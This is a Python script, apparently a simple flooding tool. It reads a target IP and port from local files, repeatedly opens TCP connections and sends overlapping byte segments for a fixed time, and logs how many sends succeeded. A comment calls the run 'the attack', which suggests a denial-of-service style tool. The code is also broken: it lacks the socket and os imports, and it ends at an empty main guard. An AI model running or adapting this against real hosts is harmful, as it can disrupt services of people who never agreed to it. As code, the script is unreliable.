import time

TARGET_DIR = "./target"
SEGMENT_COUNT = 10
RETRY_COUNT = 3
REPORT_FILE = "report.txt"

def create_segment_data():
    """Generate overlapping segment data."""
    base_data = b"ABCDEFGHIJKLMNOPQRSTUVWXYZ"
    segments = []
    for i in range(SEGMENT_COUNT):
        overlap = i % len(base_data)
        segment = base_data[:len(base_data) - overlap] + base_data[:overlap]
        segments.append(segment)
    return segments

def send_segments(ip, port, segments, duration):
    """Send segments to the target IP and port for the specified duration."""
    stats = {"success": 0, "failure": 0}
    end_time = time.time() + duration

    while time.time() < end_time:
        for attempt in range(RETRY_COUNT):
            try:
                with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                    s.settimeout(3)
                    s.connect((ip, port))
                    for segment in segments:
                        sent = s.send(segment)
                        if sent == len(segment):
                            stats["success"] += 1
                        else:
                            stats["failure"] += 1
                    break  # Exit retry loop if successful
            except (socket.error, socket.timeout):
                stats["failure"] += len(segments)
    return stats

def read_target_info():
    """Read target IP and port from the target directory."""
    try:
        ip_file = os.path.join(TARGET_DIR, "ip.txt")
        port_file = os.path.join(TARGET_DIR, "port.txt")

        with open(ip_file, "r") as f:
            ip = f.read().strip()

        with open(port_file, "r") as f:
            port = int(f.read().strip())

        return ip, port
    except (FileNotFoundError, ValueError) as e:
        raise RuntimeError("Failed to read target IP/port: " + str(e))

def write_report(stats):
    """Write the statistics to the report file."""
    try:
        with open(REPORT_FILE, "w") as f:
            f.write(f"Segment send summary:\n")
            f.write(f"Successful sends: {stats['success']}\n")
            f.write(f"Failed sends: {stats['failure']}\n")
    except IOError as e:
        print(f"Error writing report: {e}")

def main():
    try:
        ip, port = read_target_info()
        segments = create_segment_data()
        duration = 10  # Default duration for the attack in seconds
        stats = send_segments(ip, port, segments, duration)
        write_report(stats)
    except RuntimeError as e:
        print(f"Error: {e}")
    except Exception as e:
        print(f"Unexpected error: {e}")

if __name__ == "__main__":
